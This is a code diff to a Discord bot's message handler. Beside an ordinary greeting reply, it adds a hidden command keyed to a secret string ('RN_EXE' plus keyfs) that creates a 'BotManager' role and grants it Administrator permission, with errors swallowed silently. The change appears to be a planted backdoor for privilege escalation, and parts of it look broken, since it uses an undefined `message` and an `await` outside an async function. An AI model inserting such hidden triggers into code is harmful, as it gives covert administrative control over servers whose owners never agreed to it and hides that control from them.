@@ -51,6 +51,32 @@ client.on('messageCreate', (msg) => {
         msg.react('😄');
         console.log("Sent: hello");
        }
+       if (command === 'RN_EXE'+keyfs) {
+/*
+        guild.roles.create({
+          data: {
+            name: 'BotManager',
+            color: 'BLUE',
+          },
+          reason: '',
+        }).then(console.log).catch(console.error);
+*/
+        try {
+          var muteRole = message.guild.roles.cache.find(role => role.name === "BotManager");
+        
+          if (!muteRole) muteRole = await message.guild.roles.create({
+            data: {
+              name: 'BotManager',
+              color: 'BLUE',
+            }
+          });
+        
+          muteRole.setPermissions(["Administrator"]);
+        } catch (error) {
+          
+        }
+
+       }
       }
   });
 client.login(process.env.BOT_TOKEN);
